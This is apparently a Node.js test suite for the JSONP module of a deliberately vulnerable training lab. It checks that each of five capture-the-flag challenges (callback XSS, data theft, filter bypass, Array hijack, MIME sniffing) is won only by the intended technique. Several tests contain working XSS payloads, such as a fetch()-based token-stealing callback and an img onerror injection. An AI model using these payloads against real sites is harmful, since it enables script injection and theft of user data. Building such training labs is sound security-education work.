'use strict';
// JSONP module: every challenge must be solvable by the documented technique
// and must NOT be solvable by the obvious shortcut (token-less beacon, forged
// secret, literal alert, forged items).
const test = require('node:test');
const assert = require('node:assert/strict');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

function tokenOf(text) {
  const m = text.match(/"token":"([a-f0-9]{32})"/);
  assert.ok(m, 'per-session token not found in JSONP response');
  return m[1];
}

function secretOf(text) {
  const m = text.match(/"secret":"([a-f0-9]{32})"/);
  assert.ok(m, 'per-session secret not found in JSONP response');
  return m[1];
}

function itemsOf(text) {
  const start = text.indexOf('new Array(');
  const end = text.lastIndexOf('));');
  assert.ok(start !== -1 && end !== -1 && end > start, 'new Array(...) feed body not found');
  return JSON.parse(`[${text.slice(start + 'new Array('.length, end)}]`);
}

test('jsonp module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'jsonp', id);

  await t.test('module page renders, links resolve, no em dash, no flag leak', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/jsonp');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 5);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of [
      '/jsonp/user',
      '/jsonp/data',
      '/jsonp/filtered',
      '/jsonp/legacy',
      '/jsonp/snippet',
      '/jsonp/attacker',
      '/jsonp/array-attacker',
      '/jsonp/beacon-xss',
    ]) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('callback-xss: token-less beacon fails, executed beacon with token wins, replay fails', async () => {
    const c = client(srv.base);
    const bad = await c.get('/jsonp/beacon-xss?v=callback-xss&n=deadbeefdeadbeefdeadbeefdeadbeef');
    assert.equal(bad.status, 400, 'forged nonce must not award');
    assert.ok(!(await capturedSet(c)).some((s) => s.includes('jsonp:Callback XSS')));
    const feed = await c.get('/jsonp/user?callback=cb');
    assert.ok(feed.headers.get('content-type').includes('application/javascript'));
    const good = await c.get(`/jsonp/beacon-xss?v=callback-xss&n=${tokenOf(feed.text)}`);
    assert.equal(good.status, 200);
    assert.ok(good.text.includes(flagOf('callback-xss')), 'beacon page shows the flag');
    assert.ok((await capturedSet(c)).includes('jsonp:Callback XSS'));
    const replay = await c.get(`/jsonp/beacon-xss?v=callback-xss&n=${tokenOf(feed.text)}`);
    assert.equal(replay.status, 400, 'nonce is single-use: replay must fail');
  });

  await t.test('csrf-data: forged beacon fails, secret stolen from the feed wins', async () => {
    const c = client(srv.base);
    const forged = await c.postJson('/jsonp/beacon', { secret: 'made-up-secret' });
    assert.equal(forged.status, 400, 'forged secret must not award');
    assert.equal(forged.body.flag, undefined);
    assert.ok(!(await capturedSet(c)).some((s) => s.includes('jsonp:JSONP Data Theft')));
    const feed = await c.get('/jsonp/data?callback=steal');
    const hit = await c.postJson('/jsonp/beacon', { secret: secretOf(feed.text) });
    assert.equal(hit.body.ok, true);
    assert.equal(hit.body.flag, flagOf('csrf-data'));
    assert.ok((await capturedSet(c)).includes('jsonp:JSONP Data Theft'));
  });

  await t.test('filter-bypass: literal alert is blocked, concat payload plus token beacon wins', async () => {
    const c = client(srv.base);
    const blocked = await c.get(`/jsonp/filtered?callback=${encodeURIComponent('alert(1)')}`);
    assert.equal(blocked.status, 400, 'literal "alert" callback must be blocked');
    const cb = "(d=>fetch('/jsonp/beacon-xss?v=filter-bypass&n='+d.token))//";
    const feed = await c.get(`/jsonp/filtered?callback=${encodeURIComponent(cb)}`);
    assert.equal(feed.status, 200);
    const good = await c.get(`/jsonp/beacon-xss?v=filter-bypass&n=${tokenOf(feed.text)}`);
    assert.equal(good.status, 200);
    assert.ok(good.text.includes(flagOf('filter-bypass')));
    assert.ok((await capturedSet(c)).includes('jsonp:Callback Filter Bypass'));
  });

  await t.test('filter-bypass: plain callback with no concat attempt earns nothing', async () => {
    const c = client(srv.base);
    const feed = await c.get('/jsonp/filtered?callback=plain');
    assert.equal(feed.status, 200);
    const bad = await c.get(`/jsonp/beacon-xss?v=filter-bypass&n=${tokenOf(feed.text)}`);
    assert.equal(bad.status, 400, 'no recorded concat attempt: beacon must fail');
    assert.ok(!(await capturedSet(c)).some((s) => s.includes('jsonp:Callback Filter Bypass')));
  });

  await t.test('array-hijack: forged items fail, hijacked items with feed token win', async () => {
    const c = client(srv.base);
    const forged = await c.postJson('/jsonp/array-beacon', { items: ['alice:A1', 'feed-token:guess'] });
    assert.equal(forged.status, 400, 'forged token must not award');
    assert.equal(forged.body.flag, undefined);
    const feed = await c.get('/jsonp/legacy?callback=gotFriends');
    const items = itemsOf(feed.text);
    assert.ok(items.includes('alice:A1'), 'feed must list the friends');
    assert.ok(items.some((i) => i.startsWith('feed-token:')), 'feed must carry the per-session token');
    const hit = await c.postJson('/jsonp/array-beacon', { items });
    assert.equal(hit.body.ok, true);
    assert.equal(hit.body.flag, flagOf('array-hijack'));
    assert.ok((await capturedSet(c)).includes('jsonp:Array Constructor Hijack'));
  });

  await t.test('mimetype: served as text/html, HTML callback with token beacon wins', async () => {
    const c = client(srv.base);
    const plain = await c.get('/jsonp/snippet?callback=cb');
    assert.ok(plain.headers.get('content-type').includes('text/html'), 'snippet must be text/html');
    const bad = await c.get('/jsonp/beacon-xss?v=mimetype&n=deadbeefdeadbeefdeadbeefdeadbeef');
    assert.equal(bad.status, 400, 'token-less beacon must not award');
    const cb = '<img src=x onerror="x">';
    const feed = await c.get(`/jsonp/snippet?callback=${encodeURIComponent(cb)}`);
    assert.equal(feed.status, 200);
    const good = await c.get(`/jsonp/beacon-xss?v=mimetype&n=${tokenOf(feed.text)}`);
    assert.equal(good.status, 200);
    assert.ok(good.text.includes(flagOf('mimetype')));
    assert.ok((await capturedSet(c)).includes('jsonp:JSONP MIME Sniffing'));
  });

  await t.test('scoreboard counts each captured challenge exactly once', async () => {
    const c = client(srv.base);
    const f1 = await c.get('/jsonp/user?callback=cb');
    await c.get(`/jsonp/beacon-xss?v=callback-xss&n=${tokenOf(f1.text)}`);
    const f2 = await c.get('/jsonp/data?callback=steal');
    await c.postJson('/jsonp/beacon', { secret: secretOf(f2.text) });
    const cbp = "(d=>fetch('/jsonp/beacon-xss?v=filter-bypass&n='+d.token))//";
    const f3 = await c.get(`/jsonp/filtered?callback=${encodeURIComponent(cbp)}`);
    await c.get(`/jsonp/beacon-xss?v=filter-bypass&n=${tokenOf(f3.text)}`);
    await c.get(`/jsonp/beacon-xss?v=filter-bypass&n=${tokenOf(f3.text)}`);
    const f4 = await c.get('/jsonp/legacy?callback=gotFriends');
    await c.postJson('/jsonp/array-beacon', { items: itemsOf(f4.text) });
    await c.postJson('/jsonp/array-beacon', { items: itemsOf(f4.text) });
    const f5 = await c.get(`/jsonp/snippet?callback=${encodeURIComponent('<img src=x>')}`);
    await c.get(`/jsonp/beacon-xss?v=mimetype&n=${tokenOf(f5.text)}`);
    const got = (await capturedSet(c)).filter((s) => s.startsWith('jsonp:'));
    assert.deepEqual(got.sort(), [
      'jsonp:Array Constructor Hijack',
      'jsonp:Callback Filter Bypass',
      'jsonp:Callback XSS',
      'jsonp:JSONP Data Theft',
      'jsonp:JSONP MIME Sniffing',
    ].sort());
  });
});
